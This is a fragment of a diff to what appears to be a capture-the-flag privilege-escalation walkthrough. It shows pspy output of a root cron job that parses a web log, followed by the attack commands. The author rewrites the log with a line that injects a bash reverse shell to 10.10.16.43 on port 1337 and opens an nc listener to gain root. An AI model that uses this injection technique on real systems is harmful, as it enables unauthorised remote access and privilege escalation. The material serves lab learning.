@@ -211,7 +211,7 @@ Running pspy tool tool to monitor running processes without the need for root pr
 2025/09/04 21:38:01 CMD: UID=0     PID=1675351 | /bin/bash /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log
 ```
 
-
+TODO
 
 ```
 analyze_http_statuses() {
@@ -234,9 +234,12 @@ analyze_http_statuses() {
 }
 ```
 
+TODO
 
 rm -f /var/www/web/user-management-service/log/application.log
 echo 'HTTP Status: x a[$(bash -i >& /dev/tcp/10.10.16.43/1337 0>&1)]' > /var/www/web/user-management-service/log/application.log
 
 
 nc -l 1337
+
+And we get root!
